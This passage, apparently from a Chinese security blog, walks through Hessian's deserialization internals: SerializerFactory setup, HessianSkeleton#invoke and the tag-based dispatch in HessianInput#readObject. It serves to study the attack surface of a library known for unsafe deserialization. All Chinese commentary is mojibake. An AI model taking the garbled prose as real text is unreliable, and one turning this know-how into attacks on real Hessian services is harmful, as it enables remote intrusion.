<span class="title function_">SerializerFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(Thread.currentThread().getContextClassLoader());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŒ‡å®šç±»åŠ è½½å™¨çš„æ„é€ æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loader ç”¨äºåŠ è½½éœ€è¦åºåˆ—åŒ–/ååºåˆ—åŒ–çš„ä¸šåŠ¡ç±»ã€åºåˆ—åŒ–å™¨ç­‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SerializerFactory</span><span class="params">(ClassLoader loader)</span> &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ WeakReference æŒæœ‰ ClassLoaderï¼š</span></span><br><span class="line">    <span class="comment">// é¿å…é•¿ç”Ÿå‘½å‘¨æœŸçš„ SerializerFactory å¼ºå¼•ç”¨å¯¼è‡´ WebApp ClassLoader æ— æ³•è¢« GCï¼Œ</span></span><br><span class="line">    <span class="comment">// è¿›è€Œå¼•å‘çƒ­éƒ¨ç½²åçš„å†…å­˜æ³„æ¼ã€‚</span></span><br><span class="line">    _loaderRef = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;ClassLoader&gt;(loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸºäºç»™å®šçš„ç±»åŠ è½½å™¨æ„å»ºâ€œä¸Šä¸‹æ–‡åºåˆ—åŒ–å·¥å‚â€ï¼Œ</span></span><br><span class="line">    <span class="comment">// ç”¨äºæ³¨å†Œ/æŸ¥æ‰¾å…·ä½“ç±»å‹çš„ï¼ˆåï¼‰åºåˆ—åŒ–å™¨ï¼Œå®ç°æŒ‰ ClassLoader éš”ç¦»ã€‚</span></span><br><span class="line">    _contextFactory = ContextSerializerFactory.create(loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¯å¦å¯ç”¨â€œUnsafeâ€ç‰ˆæœ¬çš„å­—æ®µååºåˆ—åŒ–å·¥å‚ï¼š</span></span><br><span class="line">    <span class="comment">// - Unsafe ç‰ˆæœ¬é€šå¸¸é€šè¿‡ sun.misc.Unsafeï¼ˆæˆ– VarHandle ç­‰ï¼‰ç»•è¿‡æ„é€ å™¨ç›´æ¥åˆ†é…å¯¹è±¡ï¼Œ</span></span><br><span class="line">    <span class="comment">//   åœ¨æŸäº›åœºæ™¯ä¸‹æ›´é«˜æ•ˆï¼Œä½†å¯¹ JDK ç‰ˆæœ¬/æ¨¡å—è®¿é—®æœ‰è¦æ±‚ã€‚</span></span><br><span class="line">    <span class="comment">// - é Unsafe ç‰ˆæœ¬èµ°å¸¸è§„åå°„è·¯å¾„ï¼Œå…¼å®¹æ€§æ›´å¥½ã€é£é™©æ›´ä½ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (_isEnableUnsafeSerializer) &#123;</span><br><span class="line">        _fieldDeserializerFactory = <span class="keyword">new</span> <span class="title class_">FieldDeserializer2FactoryUnsafe</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        _fieldDeserializerFactory = <span class="keyword">new</span> <span class="title class_">FieldDeserializer2Factory</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>com.caucho.hessian.server.HessianSkeleton#invoke</code> å‡½æ•°ä¼šæ„é€  <code>HessianInput</code>&#x2F;<code>HessianOutput</code> å¹¶å°†å‰é¢åˆ›å»ºçš„ <code>serializerFactory</code> è®¾ç½®è¿›å»ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractHessianInput in;</span><br><span class="line">AbstractHessianOutput out;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">in = _hessianFactory.createHessianInput(is);</span><br><span class="line">out = _hessianFactory.createHessian2Output(os);</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">in.setSerializerFactory(serializerFactory);</span><br><span class="line">out.setSerializerFactory(serializerFactory);</span><br></pre></td></tr></table></figure></div>

<p>ä¸¤ä¸ªç±»çš„ <code>setSerializerFactory</code> å®ç°æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å°† <code>SerializerFactory</code> å¯¹è±¡è®¾ç½®åˆ° <code>_serializerFactory</code> å±æ€§ä¸Šã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSerializerFactory</span><span class="params">(SerializerFactory factory)</span> &#123;</span><br><span class="line">    _serializerFactory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ååºåˆ—åŒ–æ´¾å‘"><a href="#ååºåˆ—åŒ–æ´¾å‘" class="headerlink" title="ååºåˆ—åŒ–æ´¾å‘"></a>ååºåˆ—åŒ–æ´¾å‘</h4><p>ä¹‹åååºåˆ—åŒ–å‚æ•°æ—¶è°ƒç”¨äº† <code>HessianInput#readObject</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ååºåˆ—åŒ–å‚æ•°ï¼ˆæŒ‰å£°æ˜ç±»å‹é€ä¸ªè¯»å–ï¼‰</span></span><br><span class="line">Object[] values = <span class="keyword">new</span> <span class="title class_">Object</span>[args.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> æ›´ç»†ç²’åº¦çš„ç¼–ç»„/æ ¡éªŒå¯åœ¨æ­¤å¤„æ‰©å±•ï¼ˆä¾‹å¦‚æšä¸¾/é›†åˆçš„å®‰å…¨æ ¡éªŒï¼‰</span></span><br><span class="line">    values[i] = in.readObject(args[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>readObject</code> å‡½æ•°å®Œå…¨ç”± Hessian å®ç°ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŒ‰â€œæœŸæœ›ç±»å‹â€ä»è¾“å…¥æµè¯»å–ä¸€ä¸ªå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è¯»å–æµç¨‹è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> * 1) è‹¥æœªæŒ‡å®šç±»å‹æˆ–æœŸæœ›ç±»å‹ä¸º Objectï¼Œåˆ™èµ°æ— ç±»å‹è¯»å–ï¼ˆreadObject()ï¼‰ï¼Œå®Œå…¨ç”±æ•°æ®è‡ªæè¿°å†³å®šï¼›</span></span><br><span class="line"><span class="comment"> * 2) å¦åˆ™å…ˆè¯»ä¸€ä¸ªå­—èŠ‚çš„â€œæ ‡ç­¾(tag)â€ï¼Œæ ¹æ®æ ‡ç­¾åˆ†æ”¯å¤„ç†ï¼ˆç©ºã€Mapã€Listã€å¼•ç”¨ã€è¿œç¨‹å¼•ç”¨ç­‰ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 3) è‹¥æœªå‘½ä¸­å·²çŸ¥æ ‡ç­¾ï¼Œå›é€€åˆ°ä½¿ç”¨æœŸæœ›ç±»å‹å¯¹åº”çš„ Deserializer åšé€šç”¨è¯»å–ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl æœŸæœ›çš„ç›®æ ‡ç±»å‹ï¼ˆå¯èƒ½ä¸º null æˆ– Object.classï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å–æˆ–ååºåˆ—åŒ–å¤±è´¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">(Class cl)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// æœªé™å®šå…·ä½“ç±»å‹æ—¶ï¼Œä½¿ç”¨â€œæ— ç±»å‹è¯»å–â€è·¯å¾„ï¼ˆç”±æ•°æ®è‡ªå¸¦çš„ç±»å‹ä¿¡æ¯å†³å®šååºåˆ—åŒ–ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (cl == <span class="literal">null</span> || cl == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–ä¸€ä¸ª Hessian æ ‡ç­¾å­—èŠ‚ï¼Œç”¨äºåˆ¤å®šåç»­çš„è¯»å–åˆ†æ”¯</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">tag</span> <span class="operator">=</span> read();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tag) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// &#x27;N&#x27; â†’ Null/null</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// &#x27;M&#x27; â†’ Mapï¼ˆé”®å€¼å¯¹ï¼‰</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType(); <span class="comment">// å¯èƒ½ä¸º &quot;&quot;ï¼ˆæ— æ˜¾å¼ç±»å‹ï¼‰</span></span><br><span class="line">            <span class="comment">// hessian/3386 å…¼å®¹ï¼šå½“ type ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼ŒæŒ‰æœŸæœ›ç±»å‹çš„ååºåˆ—åŒ–å™¨è¯»å–</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                <span class="type">Deserializer</span> <span class="variable">reader</span> <span class="operator">=</span> _serializerFactory.getDeserializer(cl);</span><br><span class="line">                <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æœ‰æ˜¾å¼ç±»å‹æ—¶ï¼Œä¼˜å…ˆç”¨â€œå¯¹è±¡ç±»å‹â€çš„ååºåˆ—åŒ–å™¨ï¼ˆå¯æ˜ å°„åˆ°å…·ä½“ Java ç±»å‹ï¼‰</span></span><br><span class="line">                <span class="type">Deserializer</span> <span class="variable">reader</span> <span class="operator">=</span> _serializerFactory.getObjectDeserializer(type);</span><br><span class="line">                <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// &#x27;V&#x27; â†’ List/Collectionï¼ˆå¸¦å¯é€‰çš„ç±»å‹ä¸é•¿åº¦ï¼‰</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();      <span class="comment">// ä¾‹å¦‚é›†åˆçš„â€œå£°æ˜ç±»å‹â€æ ‡è®°</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> readLength();     <span class="comment">// å¯èƒ½ä¸º -1ï¼ˆé•¿åº¦æœªçŸ¥ï¼Œç›´åˆ° &#x27;Z&#x27; ç»“æŸï¼‰</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…ˆæ ¹æ®æ˜¾å¼ç±»å‹æ‹¿åˆ°å¯¹è±¡ååºåˆ—åŒ–å™¨</span></span><br><span class="line">            <span class="type">Deserializer</span> <span class="variable">reader</span> <span class="operator">=</span> _serializerFactory.getObjectDeserializer(type);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœæ˜¾å¼ç±»å‹ï¼ˆreader.getType()ï¼‰æ˜¯æœŸæœ›ç±»å‹ï¼ˆclï¼‰çš„å­ç±»/å®ç°ç±»ï¼Œåˆ™æŒ‰â€œæ˜¾å¼ç±»å‹â€è¯»å–</span></span><br><span class="line">            <span class="keyword">if</span> (cl != reader.getType() &amp;&amp; cl.isAssignableFrom(reader.getType())) &#123;</span><br><span class="line">                <span class="keyword">return</span> reader.readList(<span class="built_in">this</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦åˆ™æ”¹ç”¨æœŸæœ›ç±»å‹å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼ˆæ›´ä¸¥æ ¼çš„ç›®æ ‡ç±»å‹çº¦æŸï¼‰</span></span><br><span class="line">            reader = _serializerFactory.getDeserializer(cl);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">v</span> <span class="operator">=</span> reader.readList(<span class="built_in">this</span>, length);</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// &#x27;R&#x27; â†’ å¼•ç”¨ï¼ˆreferenceï¼‰ï¼Œè¯»å–æ•´å‹ä¸‹æ ‡ï¼Œä»å¼•ç”¨è¡¨ä¸­å–å›å·²ååºåˆ—åŒ–è¿‡çš„å¯¹è±¡</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">ref</span> <span class="operator">=</span> parseInt();</span><br><span class="line">            <span class="keyword">return</span> _refs.get(ref);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// &#x27;r&#x27; â†’ è¿œç¨‹å¼•ç”¨ï¼ˆremoteï¼‰ï¼Œè¯»å–è¿œç¨‹ç±»å‹ä¸ URLï¼Œé€šå¸¸è§£æä¸ºè¿œç¨‹ä»£ç†/æ¡©</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> readString();</span><br><span class="line">            <span class="keyword">return</span> resolveRemote(type, url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// æœªçŸ¥æˆ–ä¸åœ¨ä¸Šè¿°åˆ†æ”¯çš„æ ‡ç­¾ï¼šå›é€€å¤„ç†</span></span><br><span class="line">            _peek = tag; <span class="comment">// å›é€€ä¸€ä¸ªå­—èŠ‚ï¼ˆç­‰åŒâ€œæŠŠå®ƒæ”¾å›å»â€ä¾›åç»­è¯»å–ä½¿ç”¨ï¼‰</span></span><br><span class="line">            <span class="comment">// hessian/332i vs hessian/3406ï¼šå†å²å®ç°å·®å¼‚</span></span><br><span class="line">            <span class="comment">// æ—§é€»è¾‘æ˜¯ç›´æ¥ return readObject(); ä½†è¿™é‡Œé€‰æ‹©æŒ‰â€œæœŸæœ›ç±»å‹â€çš„ååºåˆ—åŒ–å™¨å¤„ç†</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> _serializerFactory.getDeserializer(cl).readObject(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»è¾“å…¥æµè¯»å–â€œæœªçŸ¥ç±»å‹â€çš„ä»»æ„å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è¯»å–è§„åˆ™ï¼ˆåŸºäºé¦–å­—èŠ‚ tagï¼‰ï¼š</span></span><br><span class="line"><span class="comment"> *   &#x27;N&#x27; â†’ null</span></span><br><span class="line"><span class="comment"> *   &#x27;T&#x27; â†’ true</span></span><br><span class="line"><span class="comment"> *   &#x27;F&#x27; â†’ false</span></span><br><span class="line"><span class="comment"> *   &#x27;I&#x27; â†’ 32 ä½æ•´æ•°ï¼ˆparseIntï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;L&#x27; â†’ 64 ä½æ•´æ•°ï¼ˆparseLongï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;D&#x27; â†’ åŒç²¾åº¦æµ®ç‚¹ï¼ˆparseDoubleï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;d&#x27; â†’ æ—¥æœŸï¼ˆlong æ¯«ç§’å€¼ â†’ new Dateï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;x&#x27;/&#x27;X&#x27; â†’ XMLï¼ˆåˆ†å—ï¼ŒX è¡¨ç¤ºæœ€åä¸€å—ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;s&#x27;/&#x27;S&#x27; â†’ å­—ç¬¦ä¸²ï¼ˆåˆ†å—ï¼ŒS è¡¨ç¤ºæœ€åä¸€å—ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;b&#x27;/&#x27;B&#x27; â†’ äºŒè¿›åˆ¶ï¼ˆåˆ†å—ï¼ŒB è¡¨ç¤ºæœ€åä¸€å—ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;V&#x27;     â†’ åˆ—è¡¨/é›†åˆï¼ˆå¯å¸¦ç±»å‹ä¸é•¿åº¦ï¼Œç”± SerializerFactory å¤„ç†ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;M&#x27;     â†’ Map/å¯¹è±¡ï¼ˆå¯å¸¦ç±»å‹ï¼Œç”± SerializerFactory å¤„ç†ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;R&#x27;     â†’ å¼•ç”¨ï¼ˆæŒ‰å¼•ç”¨è¡¨ç´¢å¼•è¿”å›å…ˆå‰å·²ååºåˆ—åŒ–çš„å¯¹è±¡ï¼‰</span></span><br><span class="line"><span class="comment"> *   &#x27;r&#x27;     â†’ è¿œç¨‹å¼•ç”¨ï¼ˆtype + urlï¼Œè§£æä¸ºè¿œç¨‹å¯¹è±¡/ä»£ç†ï¼‰</span></span><br><span class="line"><span class="comment"> *   å…¶å®ƒ    â†’ æŠ›å‡ºâ€œæœªçŸ¥ä»£ç â€å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> * - åˆ†å—ï¼ˆchunkï¼‰æ ¼å¼ï¼šè¯»å–ä¸¤å­—èŠ‚é•¿åº¦ï¼Œé…åˆ _isLastChunk æ ‡è¯†åˆ¤æ–­æ˜¯å¦è¿˜æœ‰åç»­åˆ†å—ã€‚</span></span><br><span class="line"><span class="comment"> * - å­—ç¬¦ä¸²/äºŒè¿›åˆ¶çš„å…·ä½“è¯»å–ç”± parseChar()/parseByte() é€ä¸ªæ¶ˆè´¹åˆ†å—å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment"> * - å¯¹äºå¸¦â€œç±»å‹å­—ç¬¦ä¸²â€çš„ç»“æ„ï¼Œäº¤ç»™ SerializerFactory å†³å®šå…·ä½“çš„ååºåˆ—åŒ–å™¨ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å–æˆ–è§£æå¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">tag</span> <span class="operator">=</span> read();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tag) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">            <span class="comment">// Null</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">            <span class="comment">// Boolean true</span></span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">            <span class="comment">// Boolean false</span></span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">            <span class="comment">// 32 ä½æ•´å‹</span></span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(parseInt());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            <span class="comment">// 64 ä½æ•´å‹</span></span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(parseLong());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            <span class="comment">// åŒç²¾åº¦æµ®ç‚¹</span></span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(parseDouble());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="comment">// æ—¥æœŸï¼ˆä»¥ long æ¯«ç§’å€¼è¡¨ç¤ºï¼‰</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(parseLong());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// XML åˆ†å—ï¼šX è¡¨ç¤ºæœ€åä¸€å—</span></span><br><span class="line">            _isLastChunk = tag == <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            _chunkLength = (read() &lt;&lt; <span class="number">8</span>) + read();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> parseXML();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// å­—ç¬¦ä¸²åˆ†å—ï¼šS è¡¨ç¤ºæœ€åä¸€å—</span></span><br><span class="line">            _isLastChunk = tag == <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">            _chunkLength = (read() &lt;&lt; <span class="number">8</span>) + read();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> data;</span><br><span class="line">            _sbuf.setLength(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€å­—ç¬¦è¯»å–å½“å‰åˆ†å—ï¼ŒparseChar() è¿”å› &lt;0 è¡¨ç¤ºæœ¬åˆ†å—ç»“æŸ</span></span><br><span class="line">            <span class="keyword">while</span> ((data = parseChar()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                _sbuf.append((<span class="type">char</span>) data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> _sbuf.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// äºŒè¿›åˆ¶åˆ†å—ï¼šB 